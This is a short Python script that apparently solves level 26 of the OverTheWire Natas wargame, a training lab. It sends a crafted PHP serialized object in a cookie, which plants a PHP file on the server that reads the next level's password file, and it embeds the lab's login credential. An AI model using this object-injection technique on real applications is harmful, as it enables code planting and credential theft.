import requests
from requests.auth import HTTPBasicAuth

HOST = 'http://natas26.natas.labs.overthewire.org/'
auth = HTTPBasicAuth('natas26', 'oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T')

path = 'img/a.php'

# Create this using a php script that serializes, base64 and urlencodes a Logger with the appropriate filename and endmessage fields.
payload = "YToxOntpOjA7Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czo5OiJpbWcvYS5waHAiO3M6MTU6IgBMb2dnZXIAaW5pdE1zZyI7czoyMToiIy0tc2Vzc2lvbiBzdGFydGVkLS0jIjtzOjE1OiIATG9nZ2VyAGV4aXRNc2ciO3M6NjU6Ijw%2FcGhwIGVjaG8gJ09LIEdPT0dMRSc7IGluY2x1ZGUoJy9ldGMvbmF0YXNfd2VicGFzcy9uYXRhczI3Jyk7ID8%2BIjt9fQ%3D%3D"
cookies = dict(drawing=payload)

r = requests.get(HOST, cookies=cookies, auth=auth)
print r.content

r = requests.get(HOST + path, auth=auth)
print r.content
